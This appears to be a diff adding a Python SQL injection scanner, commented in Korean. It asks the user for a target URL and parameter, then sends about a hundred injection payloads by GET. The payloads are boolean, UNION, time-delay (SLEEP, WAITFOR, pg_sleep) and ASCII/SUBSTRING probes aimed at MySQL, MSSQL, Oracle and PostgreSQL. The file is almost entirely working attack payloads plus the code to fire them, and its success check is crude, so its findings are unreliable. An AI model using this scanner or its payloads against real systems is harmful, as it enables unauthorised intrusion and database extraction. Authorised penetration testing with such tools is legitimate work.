@@ -1,0 +1,175 @@
+import requests
+
+# 사용자 입력을 통한 설정 정보 수집
+url = input("URL을 입력하세요: ")
+param_name = input("공격할 파라미터 이름을 입력하세요: ")
+param_value = input("기본 파라미터 값을 입력하세요 (예: 2): ")
+true_response_indicator = input("정상 응답의 특정 키워드 또는 텍스트를 입력하세요: ")
+
+# 인젝션 페이로드 목록
+injection_payloads = [
+    # 기본 논리 조건 - 참/거짓 테스트
+    "' AND '1'='1 -- ",
+    "' AND '1'='2 -- ",
+    "AND 1=1 --",
+    "AND 1=2 --",
+    "OR 'a'='a' -- ",
+    "OR 'a'='b' -- ",
+    "OR 1=1 --",
+    "OR 1=2 --",
+
+    # 괄호와 다양한 특수문자 위치 조합
+    "') AND ('1'='1 --",
+    "') AND ('1'='2 --",
+    "' AND (1=1) --",
+    "' AND (1=2) --",
+    ") AND (1=1 --",
+    ") AND (1=2 --",
+    "') OR ('a'='a' --",
+    "') OR ('a'='b' --",
+    "AND 1=1 /*",
+    "AND 1=2 /*",
+    "|| 1=1 #",
+    "|| 1=2 #",
+
+    # 산술 연산 및 특수 문자 추가
+    "' AND ((1+1)=2) /*",
+    "' AND ((1+1)=3) /*",
+    "AND ((2*2)=4) #",
+    "AND ((2*2)=5) #",
+    "' AND ((10/2)=5) --",
+    "' AND ((10/2)=6) --",
+
+    # 주요 DBMS별 Blind Injection 조건 및 주석 스타일
+    # MySQL
+    "' AND SLEEP(5) --",                      
+    "' AND BENCHMARK(1000000,MD5('test')) --", 
+    "' AND IF(1=1, SLEEP(5), 0) --",          
+    "' AND ASCII(SUBSTRING(DATABASE(), 1, 1)) > 64 --",
+    "' UNION SELECT NULL, NULL#",
+    "' OR 1=1 /*",
+    
+    # MSSQL
+    "'; WAITFOR DELAY '0:0:5' --",            
+    "' AND 1=(SELECT COUNT(*) FROM sysobjects WHERE xtype='U') --",  
+    "' AND ASCII(SUBSTRING((SELECT TOP 1 name FROM sysobjects), 1, 1)) > 64 --",
+    "' OR 'a' LIKE 'a'--",                    
+    "AND 1=1 --",                             
+    
+    # Oracle
+    "' AND 1=(SELECT COUNT(*) FROM all_tables) --",  
+    "' AND (SELECT COUNT(*) FROM dual WHERE 'a'='a') = 1 --",  
+    "' OR '1'='1' --",
+    "' OR 'a'='a' /*",
+    "' OR 1=1 --",
+    
+    # PostgreSQL
+    "'; SELECT pg_sleep(5) --",               
+    "' AND 1=(SELECT COUNT(*) FROM pg_catalog.pg_tables) --",
+    "' AND ASCII(SUBSTRING((SELECT tablename FROM pg_catalog.pg_tables LIMIT 1), 1, 1)) > 64 --",
+    "AND '1'='1' /*",
+    "' OR pg_sleep(5) --",
+    
+    # (CASE WHEN 구문 및 ASCII 조건 조합
+    "' AND (CASE WHEN (1=1) THEN 1 ELSE 0 END)=1 --",
+    "' AND (CASE WHEN (1=2) THEN 1 ELSE 0 END)=1 --",
+    "AND (CASE WHEN (ASCII('A')=65) THEN 1 ELSE 0 END)<2 --",
+    "AND (CASE WHEN (NULL IS NULL) THEN 1 ELSE 0 END)=1 --",
+
+    # 다양한 위치의 특수문자와 주석 스타일
+    "' /*' OR '1'='1 --",
+    "' /*' OR '1'='2 --",
+    "';--",
+    "'; /*",
+    "' OR 'a'='a'; --",
+    "' AND 1=1; --",
+    "' OR '1'='1'/*",
+    "'; /* SQL Injection Detection */",
+    "'--",
+    "'/*",
+    "#",
+    ";--",
+    
+    # LIKE 및 특수문자 조합
+    "' AND ('text' LIKE 'te%') --",
+    "' AND ('text' LIKE 'xx%') --",
+    "' OR ('%' LIKE '%') /*",
+    "' AND ('%' = '%') /*",
+    
+    # SUBSTRING, LENGTH와 특수문자 조합
+    "' AND (LENGTH('testing')=7) --",
+    "AND (LENGTH('example') > 4) /*",
+    "' AND (SUBSTRING('hello', 1, 1)='h') --",
+    "AND (SUBSTRING('world', 2, 1)='o') /*",
+    
+    # ASCII 값 조건과 주석 포함 조합
+    "' AND (ASCII('A')=65) /*",
+    "' AND (ASCII('B')=66) --",
+    "AND (ASCII('C')>64) --",
+    "AND ASCII('D')=68 /*",
+    
+    # 복합 조건 (다양한 위치에 특수문자 및 주석 추가)
+    "AND 1 BETWEEN 0 AND 2 --",
+    "AND 2 BETWEEN 1 AND 3 /*",
+    "OR (5=5 AND 6=6) --",
+    "AND LENGTH('hello') > 3 #",
+    "OR LENGTH('example') < 10 /*",
+
+    # 추가 Blind Injection 페이로드
+    "' AND 1=1#",
+    "' OR 'a'='a'; WAITFOR DELAY '00:00:05' --",
+    "' OR 1=1; SELECT pg_sleep(5) --",
+    "' OR (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE NULL END); --", # PostgreSQL CASE 조건 지연
+    "' AND 1=(SELECT COUNT(*) FROM users WHERE SUBSTRING(username,1,1)='a') --",
+    "' AND EXISTS(SELECT * FROM information_schema.tables WHERE table_name = 'users') --",
+    "' AND NOT EXISTS(SELECT * FROM information_schema.tables WHERE table_name = 'nonexistent') --",
+    "' AND 1=(SELECT COUNT(*) FROM dual WHERE 'a'='a') --", # Oracle 전용
+    "' AND (CASE WHEN 1=1 THEN 1 ELSE 0 END) = 1 --",
+    "' AND 1 BETWEEN 1 AND 2 --",
+    "' OR (1=1 AND 1=1) /*",
+    "' AND 1=(SELECT COUNT(*) FROM pg_catalog.pg_tables WHERE tablename LIKE 'a%') --",
+    "' OR (ASCII('A') > 60) /*",
+    "' AND 'test' LIKE CONCAT('%', 't', '%') --",  # MySQL 문자열 조합
+    "' OR (SELECT NULLIF(ASCII('B'), 66)) IS NULL /*",  # MySQL NULLIF 함수
+    "' AND (LENGTH((SELECT 'a')) > 0) /*",
+    "' AND COALESCE(NULL, 'a') = 'a' --",
+    "' OR IF(ASCII(SUBSTRING(DATABASE(),1,1)) > 64, SLEEP(5), 0) --",  # MySQL 조건 기반 지연
+]
+
+# 취약점 탐지 함수
+def detect_sql_injection():
+    print("[정보] SQL Injection 취약점 탐지 시작...")
+    
+    detected_payloads = []  # 탐지된 페이로드를 저장할 리스트
+
+    # 각 페이로드별로 테스트
+    for payload in injection_payloads:
+        # 기본 파라미터 값에 인젝션 페이로드 추가
+        params = {param_name: f"{param_value} {payload}"}
+
+        try:
+            # HTTP GET 요청 보내기
+            response = requests.get(url, params=params, timeout=10)
+            
+            # 응답에서 true_response_indicator 포함 여부 확인
+            if true_response_indicator in response.text:
+                print(f"[취약점 발견] '{payload}' 페이로드에서 SQL Injection 취약점이 감지되었습니다.")
+                detected_payloads.append(payload)  # 탐지된 페이로드를 리스트에 추가
+            else:
+                print(f"[확인 필요] '{payload}' 페이로드에서는 취약점이 감지되지 않았습니다.")
+
+        except requests.RequestException as e:
+            print(f"[오류] '{payload}' 페이로드 테스트 중 오류 발생: {e}")
+
+    # 탐지 결과 출력
+    print("\n[결과] SQL Injection 취약점 탐지 종료.")
+    print(f"총 {len(detected_payloads)}건의 SQL Injection 취약점이 감지되었습니다.\n")
+    
+    if detected_payloads:
+        print("탐지된 페이로드 목록:")
+        for idx, detected_payload in enumerate(detected_payloads, 1):
+            print(f"{idx}. {detected_payload}")
+
+# 프로그램 실행
+if __name__ == "__main__":
+    detect_sql_injection()
